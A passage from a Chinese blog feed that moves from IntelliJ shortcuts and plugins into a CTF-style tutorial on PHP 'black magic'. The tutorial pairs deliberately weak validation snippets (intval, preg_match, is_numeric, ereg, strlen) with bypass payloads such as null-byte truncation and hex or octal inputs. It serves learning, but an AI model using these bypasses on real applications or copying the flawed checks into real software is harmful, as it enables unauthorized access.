G：go to（跳转指定行号）</strong></li></ul><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><ul><li><strong>Ctrl + W：快速选中</strong></li><li><strong>(Shift + Ctrl) + Alt + J：快速选中同文本</strong></li><li><strong>Ctrl + C&#x2F;Ctrl + X&#x2F;Ctrl + D：快速复制或剪切</strong></li><li><strong>多行选中 Tab ：tab</strong></li><li><strong>Ctrl + Y&#x2F;ctrl + X：删除整行</strong></li><li><strong>Shift + 点击Tab：快速关闭tab</strong></li><li><strong>Ctrl + Shift + enter：自动收尾，代码自动补全</strong></li><li><strong>Alt + ↑&#x2F;↓：方法快速跳转</strong></li><li><strong>F2：跳转到下一个高亮错误 或 警告位置</strong></li><li><strong>Alt + Insert：代码自动生成，如生成对象的 set &#x2F; get 方法，构造函数，toString() 等</strong></li><li><strong>Ctrl + Shift + L：格式化代码</strong></li><li><strong>Shift + F6：快速修改方法名、变量名、文件名、类名等</strong></li><li><strong>Ctrl + F6：快速修改方法签名</strong></li></ul><h4 id="代码阅读"><a href="#代码阅读" class="headerlink" title="代码阅读"></a>代码阅读</h4><ul><li><strong>Ctrl + P：方法参数提示显示</strong></li><li><strong>Ctrl + Shift + i：就可以在当前类里再弹出一个窗口出来</strong></li><li><strong>Alt + F7：可以列出变量在哪些地方被使用了</strong></li><li><strong>光标在子类接口名，Ctrl + u：跳到父类接口</strong></li><li><strong>Ctrl + Shift + ←&#x2F;→：移动窗口分割线</strong></li><li><strong>Ctrl + (Alt) + B：跳转方法定义&#x2F;实现</strong></li><li><strong>Ctrl + F12：Show Members 类成员快速显示</strong></li><li><strong>Ctrl + H：类的层级关系</strong></li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><ul><li><p><strong>JetBrains AI Assistant</strong></p><p>JetBrains AI Assistant 提供了一个全面的 AI 聊天，可以根据您的项目上下文回答与代码相关的问题。它还提供了各种 AI 操作来<strong>解释代码、发现问题、建议重构、生成测试、协助提交消息和文档</strong>等</p></li><li><p><strong>Key Promoter X 快捷键提示插件</strong></p><p>当你在IDE中使用鼠标点击一个按钮时，这个插件会提醒你可以使用的键盘快捷键。如果经常使用一个没有键盘快捷键的按钮，”Key Promoter X”会提示创建一个快捷键。如果已经很熟悉了某个快捷键，该插件支持设置了”不再显示”的选项。</p></li><li><p><strong>CodeGlance 显示代码缩略图插件</strong></p></li><li><p><strong>Save Actions 格式化代码插件</strong></p><p>可以帮忙我们优化包导入，自动给没有修改的变量添加final修饰符，调用方法的时候自动添加this关键字等，使我们的代码更规范统一。</p></li><li><p><strong>Translation 翻译插件</strong></p></li><li><p><strong>Maven Helper</strong> </p><p> 方便maven项目解决jar冲突</p></li><li><p><strong>jclasslib bytecode viewer</strong></p><p>查看字节码</p></li><li><p><strong>通义灵码</strong> </p><p>是基于通义大模型的智能编程辅助工具，提供行级&#x2F;函数级实时续写、自然语言生成代码、单元测试生成、代码优化、注释生成、代码解释、研发智能问答、异常报错排查等能力，并针对阿里云的云服务使用场景调优，助力开发者高效、流畅地编码</p></li><li><p><strong>Json Parser</strong></p><p>JSON解析器是一个用于验证和格式化JSON字符串的轻量级插件。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java学习 </category>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP黑魔法</title>
      <link href="/archives/afbb3374/"/>
      <url>/archives/afbb3374/</url>
      
        <content type="html"><![CDATA[<h2 id="黑魔法"><a href="#黑魔法" class="headerlink" title="黑魔法"></a>黑魔法</h2><p>所谓黑魔法，即指在web开发中，一些看似违反直觉，但能实现特殊功能的技巧或语言特性，而这些特性往往依赖php的弱类型、动态特性或隐式转换机制，就是利用函数的逻辑漏洞来进行攻击。</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>如果存在<code>&lt;?php include(&#39;flag.php&#39;);</code>，可以用下面的方法得到flag</p><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><p>php全局变量$GLOBALS引用全局作用域中可用的全部变量，可利用这个特性看flag:</p><p><img src="/archives/afbb3374/QQ20250119-191713.png"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>用法：**<code>var_dump(get_defined_vars())</code>**</p><p><img src="/archives/afbb3374/QQ20250119-192121.png"></p><h2 id="intval-函数缺陷"><a href="#intval-函数缺陷" class="headerlink" title="intval()函数缺陷"></a>intval()函数缺陷</h2><p><strong><code>intval()</code></strong> 函数用于将其他类型的数据转化为整型数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><blockquote><p><code>$value</code>:需要使用intval()进行转化的数据</p><p><code>$base</code>：指定被转化数据采用的进制(默认为10进制)</p></blockquote><p><strong>字符串解析：</strong></p><ul><li><p>若字符串的<strong>首个字符不为数字且不为空格等空白字符</strong>，则该字符串转化为零。</p></li><li><p>若字符串的<strong>首个字符不为数字但为空格等空白字符</strong>，则尝试读取其余字符，若<strong>忽略到数字字符前的所有空白字符，在遇到非数字字符时停止对字符串的读取并将已读取字符串转化为数值。</strong></p><blockquote><p>即把前面空格去掉在解析</p></blockquote></li><li><p>若字符串的 <strong>首个字符为数字</strong>，则尝试读取其余字符，<strong>在遇到非数字字符（除符合科学计数法格式的字符 e 或 E外）时停止对字符串的读取并将已读取字符转化为数值。</strong></p></li></ul><h3 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h3><p>所以当遇到下面这些情况时就可用科学计数法绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>虽然科学计数法的数值（字符串）在某些版本（如php7.0.0）无法被**<code>intval()</code>正确解析**，但PHP是默认得到它的，在与数值 <code>1</code> 进行加法运算时，<code>$num</code> 将被 <code>PHP</code> 正确解析。</p><h3 id="进制转换绕过"><a href="#进制转换绕过" class="headerlink" title="进制转换绕过"></a>进制转换绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这种情况，就看他转换为八进制或者十六进制来绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0b?? : 二进制</span><br><span class="line">0??? : 八进制</span><br><span class="line">0X?? : 十六进制</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=0x117c || num=010574</span><br></pre></td></tr></table></figure><p>再看下面这种情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就是正则匹配过滤了字母，所以不能用十六进制了，可以转换为八进制.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=010574</span><br></pre></td></tr></table></figure><h3 id="小数点绕过"><a href="#小数点绕过" class="headerlink" title="小数点绕过"></a>小数点绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;  <span class="comment">//禁用字母</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="comment">//禁止0开头</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>像上诉这个就不能使用进制转换了，那么可以使用传值小数，intval()会帮我们转换为整型，以此达到绕过的目的。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=114514.114514</span><br></pre></td></tr></table></figure><h2 id="preg-match-函数缺陷"><a href="#preg-match-函数缺陷" class="headerlink" title="preg_match()函数缺陷"></a>preg_match()函数缺陷</h2><p><img src="/archives/afbb3374/QQ20250119-193819.png"></p><p><code>preg_match()</code>主要用于执行正则匹配，其基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int preg_match(string $pattern,string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</span><br><span class="line">    参数说明：</span><br><span class="line"></span><br><span class="line">    $pattern: 要搜索的模式，字符串形式。</span><br><span class="line"></span><br><span class="line">    $subject: 输入字符串。</span><br><span class="line"></span><br><span class="line">    $matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line"></span><br><span class="line">    $flags：flags 可以被设置为以下标记值：</span><br><span class="line"></span><br><span class="line">        PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span><br><span class="line"></span><br><span class="line">    offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span><br></pre></td></tr></table></figure><p>而php手册告诉我们，该函数的返回值有三种，分别为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//如果匹配到</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//如果没匹配到</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//匹配失败</span></span><br></pre></td></tr></table></figure><blockquote><p>安全的写法是使用 <strong>&#x3D;&#x3D;&#x3D;</strong> 运算符对返回值进行比较，手册推荐用效率更快的 <strong>strpos</strong> 函数替代 <strong>preg_match</strong> 函数</p></blockquote><p><img src="/archives/afbb3374/QQ20250119-200627.png"></p><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p><code>preg_match</code>只能处理字符串，如果<strong>传入数组会返回false</strong>，不会进入if语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$num</span>[]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;php_is_not_safe&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/afbb3374/QQ20250119-202651.png"></p><h3 id="0a换行符绕过"><a href="#0a换行符绕过" class="headerlink" title="%0a换行符绕过"></a>%0a换行符绕过</h3><p>**<code>.</code>不会匹配换行符(<code>\n</code>,<code>\r</code>)**，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*hello.*$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="string">&#x27;hello&#x27;</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/afbb3374/QQ20250119-212633.png"></p><blockquote><p>%0a不行</p></blockquote><p>而在<strong>非多行模式下(即&#x2F;i模式下）</strong>，**<code>$</code>会忽略在句尾的<code>%0a</code>**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^hello$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="string">&#x27;hello&#x27;</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>^和$字符用来匹配字符串的开始和结束，要求我们必须是hello</p></blockquote><p><img src="/archives/afbb3374/QQ20250119-215529.png"></p><h3 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h3><p>具体可以参考p牛的博客：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>如果我们输入<code>phpinfo();//aaaaa</code>，由于**<code>.*</code>可以匹配任意字符，此时会进入贪婪模式，会将<code>phpinfo();//aaaaa</code>所有字符进行匹配**</p><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>，<strong>如果回溯次数大于1000000次时返回False</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure><h2 id="trim-及is-numberic-函数缺陷"><a href="#trim-及is-numberic-函数缺陷" class="headerlink" title="trim()及is_numberic()函数缺陷"></a>trim()及is_numberic()函数缺陷</h2><p><img src="/archives/afbb3374/QQ20250120-184839.png"></p><p>trim函数会过滤空格以及<code>\n\r\t\v\x00</code>，但<strong>不会过滤<code>\f(%0c)(换行符)</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot; \n\r\t\v\x00 a \f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$a</span>));  <span class="comment">//a \f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/afbb3374/QQ20250120-191224.png"></p><p><code>is_numberic</code>用于检测是否是数字或数字字符串，而当数字前面有<strong>空格或<code>\n\t\r\f\v</code>等换行符时会被认为是数字</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;\n1&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;\t1&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;\f1&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&quot;\r1&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&quot;\v1&quot;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot; 1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$d</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$e</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$f</span>));<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><p>所以**<code>\f</code>能突破这两个函数的限制**，下面例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$num</span>=<span class="string">&quot;\f36&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//flag&#123;php_is_not_safe&#125;</span></span><br></pre></td></tr></table></figure><h2 id="strcmp函数缺陷"><a href="#strcmp函数缺陷" class="headerlink" title="strcmp函数缺陷"></a>strcmp函数缺陷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>在<strong>php5.3之前</strong>，当这个函数接受到了<strong>不符合的类型，这个函数将发生错误，显示了报错的警告信息后，将return 0。</strong></p><h2 id="ereg-，eregi-函数缺陷"><a href="#ereg-，eregi-函数缺陷" class="headerlink" title="ereg()，eregi()函数缺陷"></a>ereg()，eregi()函数缺陷</h2><p><code>int ereg(string pattern, string originalstring, [array regs])</code>函数<strong>用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回1,否则返回0，且搜索对大小写敏感</strong></p><p><code>ereg()</code>函数存在<strong>NULL截断漏洞</strong>，当传入的字符串包含<code>%00</code>时，只有**<code>%00</code>前的字符串会传入函数并执行<strong>，而后半部分不会传入函数判断。因此可以使用</strong><code>%00</code>截断，连接非法字符串，从而绕过函数**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>十六进制数 <code>0x36d</code>即十进制的 <code>877</code>，反转后是778</p><p>所以payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br></pre></td></tr></table></figure><p><img src="/archives/afbb3374/QQ20250120-194053.png"></p><h2 id="strlen-函数缺陷"><a href="#strlen-函数缺陷" class="headerlink" title="strlen()函数缺陷"></a>strlen()函数缺陷</h2><p>strlen()函数用于求字符串的长度，可以用科学计数法来绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&lt;<span class="number">4</span> &amp;&amp; <span class="variable">$a</span>&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;is too small&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e9</span><br></pre></td></tr></table></figure><h2 id="strpos-函数缺陷"><a href="#strpos-函数缺陷" class="headerlink" 